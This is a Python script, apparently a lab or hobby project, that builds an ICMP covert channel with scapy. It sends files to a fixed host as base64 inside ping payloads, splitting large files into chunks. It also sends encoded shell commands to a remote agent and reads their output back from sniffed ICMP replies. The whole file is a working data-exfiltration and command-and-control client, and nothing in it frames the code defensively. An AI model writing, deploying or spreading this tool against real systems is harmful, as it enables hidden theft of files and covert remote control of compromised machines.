from scapy.all import *
import base64

destination = "192.168.56.1"
sniffInterface = "eth0"

CHUNK_SIZE = 1024

def chunkstring(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

def read_in_chunks(file_object, chunk_size=1024):
    """Lazy function (generator) to read a file piece by piece.
    Default chunk size: 1k."""
    while True:
        data = file_object.read(chunk_size)
        if not data:
            break
        yield data

while True:

    action = input("-----------------------\nWhat should we do (with a lazy sailor) ? \nActions are : file | bigfile | message | command\n")
	
    if action == "file":
		
        fileName = input("Which file should we send ?\n")
        fileToSend = open(fileName,"rb")
        binaryData = fileToSend.read()
        encoded = (base64.b64encode(binaryData)).decode('ascii')


        # Protocole : type d'envoi (file/message)
        p = sr1(IP(dst=destination)/ICMP()/"file")
        p = sr1(IP(dst=destination)/ICMP()/fileName)
        p = sr1(IP(dst=destination)/ICMP()/encoded)

    elif action == "bigfile":
        fileName = input("Which file should we send ?\n")
        
        print("Sending protocol and filename")
        # Protocole : type d'envoi (file/message)
        p = sr1(IP(dst=destination)/ICMP()/"bigfile")
        p = sr1(IP(dst=destination)/ICMP()/fileName)

        fileStats = os.stat(fileName)
        print(f'File Size in Bytes is {fileStats.st_size}')
        predictedNumberOfPings = math.ceil(fileStats.st_size / CHUNK_SIZE)

        p = sr1(IP(dst=destination)/ICMP()/str(predictedNumberOfPings))

        pingCounter = 0
        with open(fileName,"rb") as f:
            for piece in read_in_chunks(f, CHUNK_SIZE):
                encoded = (base64.b64encode(piece)).decode('ascii')
                p = send(IP(dst=destination)/ICMP()/encoded)
                pingCounter = pingCounter + 1

        print(f'Predicted number of pings to send: {predictedNumberOfPings}')
        print("Number of pings sent: "+str(pingCounter))
        print("Sending bigfileSTOP")
        p = send(IP(dst=destination)/ICMP()/"bigfileSTOP")

    elif action == "command":

        command = input("What command should we run ?\n")
        encodedCommand = base64.b64encode(command.encode('utf-8'))

        # Protocole : type d'envoi (file/message)
        p = sr1(IP(dst=destination)/ICMP()/"command")
        p = sr1(IP(dst=destination)/ICMP()/encodedCommand)

        icmpReceived = sniff(iface=sniffInterface, filter="icmp", count=1)
        base64Output = icmpReceived[0][3].fields.get("load").decode("utf-8")
        print(base64.b64decode(base64Output))
	


    elif action == "message":
        print("Not implemented yet")
